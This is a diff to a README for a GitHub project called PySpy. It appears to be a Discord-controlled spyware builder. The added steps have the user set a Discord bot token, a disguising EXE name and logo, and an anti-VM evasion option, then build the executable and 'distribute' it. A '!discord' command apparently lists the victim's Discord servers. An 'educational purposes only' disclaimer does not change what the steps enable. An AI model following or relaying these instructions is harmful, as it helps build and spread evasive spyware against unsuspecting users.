@@ -25,3 +25,13 @@ This project is intended for educational purposes only. The author is not respon
    ```
    git clone https://github.com/LunarrBlue/PySpy.git
    cd PySpy
+2. Configure `config.json`
+   - "token" -> Your Discord bots token
+   - "app_name" -> Name of the EXE
+   - "app_logo" -> Path to EXE logo
+   - "members" -> Mimimum members in a Discord server to be shown by `!discord`
+   - "anti-vm" -> Defines if anti-vm should be enabled
+3. Run `build.bat` and wait
+4. Distribute the EXE located in `dist`
+---
+If you would like to rebuild the EXE for any reason, run `rebuild.bat` then follow the steps above.
